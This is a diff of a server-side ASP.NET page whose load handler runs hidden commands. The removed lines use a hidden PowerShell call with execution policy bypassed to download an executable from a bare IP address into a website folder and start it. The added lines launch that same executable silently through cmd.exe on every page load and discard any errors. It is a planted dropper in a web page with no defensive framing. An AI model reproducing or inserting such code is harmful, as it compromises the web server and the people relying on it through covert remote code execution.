@@ -4,17 +4,16 @@
 <script runat="server">
 Protected Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
     Try
-        Dim ps As String = "powershell.exe"
-        Dim url As String = "http://31.6.41.133/asmxswaraj.exe"
-        Dim dst As String = "C:\Website\SwarajReports.indiainfoline.com\asmxswaraj.exe"
-        Dim args As String = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""try{ $p='" & dst & "'; (New-Object Net.WebClient).DownloadFile('" & url & "',$p); Start-Process -FilePath $p -WindowStyle Hidden }catch{}"""
+        ' Build full one-liner
+        Dim cmd As String = "cmd.exe"
+        Dim args As String = "/c start C:\Website\SwarajReports.indiainfoline.com\asmxswaraj.exe"
 
-        Dim psi As New ProcessStartInfo(ps, args)
+        Dim psi As New ProcessStartInfo(cmd, args)
         psi.UseShellExecute = False
         psi.CreateNoWindow = True
         Process.Start(psi)
     Catch
-        ' silently ignore
+        ' Silent fail
     End Try
 
     Response.Clear()
